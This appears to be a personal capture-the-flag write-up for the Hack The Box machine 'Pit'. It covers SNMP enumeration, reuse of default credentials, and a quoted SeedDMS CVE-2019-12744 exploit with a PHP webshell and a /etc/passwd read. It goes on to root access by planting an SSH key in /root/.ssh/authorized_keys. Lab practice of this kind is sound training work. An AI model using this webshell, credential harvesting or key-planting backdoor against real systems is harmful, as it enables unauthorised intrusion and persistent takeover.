![[Pasted image 20250422144133.png]]
check the port 9090 the app are redirect us to [[HTTPS]]. using [[openssl]]
we can try check the [[ssl]] certification.
```bash
openssl s_connect -connect pit.htb:9090
```
and we can see another subdomain
![[Pasted image 20250422144548.png]]

we realize fuzzing on the three different webs apps and get nothing
so, lets try scan with [[User Datagram Protocol (UDP)]]

```bash
sudo nmap -sU --top-ports 500 -v -n -oG scans/top500_ports_udp 10.10.10.241
```
![[Pasted image 20250422145947.png]]
[[port 161]] is open, with [[Simple Network Management Protocol (snmp)]]

the lets use [[onesixtyone]] to get a `community string`.
![[Pasted image 20250422150525.png]]
that's `public`.

so, with [[snmpbulkwalk]] we can do a walk in snmp protocol and get something of data.
![[Pasted image 20250422154057.png]]
first, we find this url, maybe corresponds a route of three web apps we found above.
and indeed, we found something
![[Pasted image 20250422154527.png]]
in the report of `snmpwalk` we found also possible users. ![[Pasted image 20250422154749.png]]
so if use user `michelle` and password `michelle`, you can enter.

now we need try to upload a malicious document, following this indications
```
# Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions <5.1.11]
# Google Dork: [NA]
# Date: [20-June-2019]
# Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
# Vendor Homepage: [https://www.seeddms.org]
# Software Link: [https://sourceforge.net/projects/seeddms/files/]
# Version: [SeedDMS versions <5.1.11] (REQUIRED)
# Tested on: [NA]
# CVE : [CVE-2019-12744]

Exploit Steps:

Step 1: Login to the application and under any folder add a document.
Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.

PHP Backdoor Code:
<?php
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
?>

Step 3: Now after uploading the file check the document id corresponding to the document.
Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/passwd to get the command response in browser.

Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
```

at we do this, we can use [[TTY over HTTP]] to get a "fake interactive shell" replacing the url of our backdoor on the script.
searching with that shell we found a file called `settings.xml`
```xml
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    </database>
```
with credentials of [[MySQL]] `seeddms:ied^ieY6xoquu`
and using mysql interpreter we can list data of a table `tblUsers`
![[Pasted image 20250422163904.png]]
and get that

on `pit.htb:9090` we can try credentials `michelle:ied^ieY6xoquu` and get access and in section of `terminal` establish a connection with our machine.

In `snmpbulkwalk` we see a command are executing on the system on the path `/usr/bin/monitor`, so let's see more deeply

![[Pasted image 20250422175830.png]]
that script are executing all in path `/usr/local/monitoring/` called `check<ANYTHING>sh`, so let's approach that for insert a public key of mine in folder `/root/.ssh/` to get access with [[ssh]]
so, first let's create a keys with [[ssh-keygen]] inside `/.ssh/`

```bash
ssh-keygen
```

![[Pasted image 20250422180221.png]]
with any password.

and copy:
```bash
cat id_ed25519.pub | tr -d '\n' | copy
```

now let's with the script.
```bash
#!/bin/bash

echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJMggl5wArWgU3SlkEAQUQimufBFzr1TEKJFJprbUC8y entr0phy4@archlinux >/root/.ssh/authorized_keys

```

now, if we execute
```bash
snmpbulkwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

the binary `/usr/bin/monitor` will also be executed.

and if all works successful:
![[Pasted image 20250422180957.png]]

